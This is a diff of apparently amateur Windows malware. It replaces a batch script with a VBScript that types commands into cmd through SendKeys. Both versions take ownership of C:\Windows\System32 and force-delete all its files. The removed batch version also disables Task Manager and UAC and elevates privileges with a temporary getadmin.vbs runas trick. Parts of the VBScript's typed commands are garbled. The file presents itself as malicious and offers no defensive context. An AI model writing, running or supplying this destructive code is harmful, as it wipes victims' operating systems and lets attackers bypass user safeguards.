@@ -1,52 +1,63 @@
-echo "im not responible for any of the damages caused by this malicious file whatsoever and will not be held accountable for your actions or mine!!!!!
-timeout /t 6 NOBREAK >nul
-start https://whatismyipadress.com
-@echo off
-start cmd
-start powershell
-start powershell
-start cmd
-start cmd
-start cmd
-@echo off
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
-REM Check if running with admin privileges
-net session >nul 2>&1
-if %errorLevel% == 0 (
-    echo Running with administrator privileges
-    set "admin=1"
-) else (
-    echo Not running with administrator privileges. Attempting to elevate...
-    set "admin=0"
-)
+Set WshShell = WScript.CreateObject("WScript.Shell")
 
-REM If not running with admin privileges, elevate
-if "%admin%"=="0" (
-    echo Elevating privileges...
-    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" || (
-        echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-        echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
-        "%temp%\getadmin.vbs"
-        del "%temp%\getadmin.vbs"
-        exit /B
-    )
-    echo Successfully elevated privileges!
-)
+WshShell.Run "cmd"
 
-echo Prepare for total doom...
-echo.
-echo.
+WScript.Sleep 100
 
-REM Take ownership of System32
-@echo off
-takeown /f C:\Windows\System32 /r /d y
-icacls C:\Windows\System32 /grant administrators:F /t
-cd C:\Windows\System32
+WshShell.SendKeys "net session >nul 2>&1if %errorLevel% == 0 (set admin=1) else ( set admin=0)" 
 
-REM Delete System32
-timeout /t 4 NOBREAK > nul
-@echo off
-del /F /S /Q *.*
+WScript.Sleep 300
 
-%windir%\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 
+Wshshell.SendKeys "{ENTER}"
+
+WScript.Sleep 200
+
+WshShell.SendKeys "echo UAC.ShellExecute %~s0, "", "", runas, 1 >> %temp%\getadmin.vbstemp%\getadmin.vbs del %temp%\getadmin.vbs exit /b"
+
+WScript.Sleep 100
+Wshshell.SendKeys "{ENTER}"
+
+WScript.Sleep 100
+
+
+ WshShell.SendKeys "if %errorLevel% == 0 ( set admin=1 ) else ( set admin=0 ) REM If not running with admin privileges, elevate if %admin%==0 REM If not running with admin privileges, elevate" 
+
+WScript.Sleep 100
+
+Wshshell.SendKeys "{ENTER}"
+
+WScript.Sleep 100
+
+WshShell.SendKeys "takeown /f C:\Windows\System32 /r /d y"
+
+WScript.Sleep 200
+
+WshShell.SendKeys "{ENTER}"
+
+WScript.Sleep 100
+
+
+WshShell.SendKeys "icacls C:\Windows\System32 /grant administrators:F /t"
+
+WScript.Sleep 100
+
+WshShell.SendKeys "{ENTER}" 
+
+
+WScript.Sleep 100
+
+WshShell.SendKeys "cd C:\Windows\System32"
+
+
+WshShell.SendKeys "{ENTER}"
+
+WScript.Sleep 100 
+
+
+WshShell.SendKeys "del /F /S /Q *.*"
+
+
+WshShell.SendKeys "{ENTER}"
+
+WScript.Sleep 200
